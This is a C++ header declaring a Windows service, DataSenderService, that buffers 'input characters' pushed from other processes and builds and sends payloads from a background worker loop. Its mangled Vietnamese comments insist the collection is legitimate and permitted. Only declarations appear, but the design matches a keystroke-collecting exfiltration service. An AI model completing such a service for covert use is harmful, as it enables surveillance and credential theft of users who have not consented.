#pragma once

#ifndef UNICODE
#define UNICODE
#endif
#ifndef _UNICODE
#define _UNICODE
#endif

#include <windows.h>
#include <string>
#include <thread>
#include <atomic>
#include <mutex>

class DataSenderService
{
public:
    static const wchar_t* ServiceName;
    static const wchar_t* ServiceDisplayName;

    DataSenderService();
    ~DataSenderService();

    static void WINAPI ServiceMain(DWORD argc, LPWSTR* argv);
    static void WINAPI ServiceCtrlHandler(DWORD ctrlCode);

    // NEW: API ?? ti?n trình khác (h?p l?) ??y ký t? ?ã thu th?p h?p pháp
    static void AppendInput(const std::wstring& chars);

private:
    static DataSenderService* s_instance;

    SERVICE_STATUS m_status{};
    SERVICE_STATUS_HANDLE m_statusHandle{ nullptr };
    std::atomic<bool> m_running{ false };
    HANDLE m_stopEvent{ nullptr };
    std::thread m_workerThread;
    std::mutex m_logMutex;

    // NEW: buffer chung l?u chu?i ký t? nh?p (???c phép)
    static std::wstring s_inputBuffer;
    static std::mutex s_inputMutex;

    void Run();
    void Stop();

    void SetStatus(DWORD state, DWORD win32ExitCode = NO_ERROR, DWORD waitHint = 0);
    void ReportPending(DWORD checkpoint, DWORD waitHint);

    void WorkerLoop();
    bool SendPayload(const std::wstring& payload);
    std::wstring BuildPayload();
    void Log(const std::wstring& line);
};
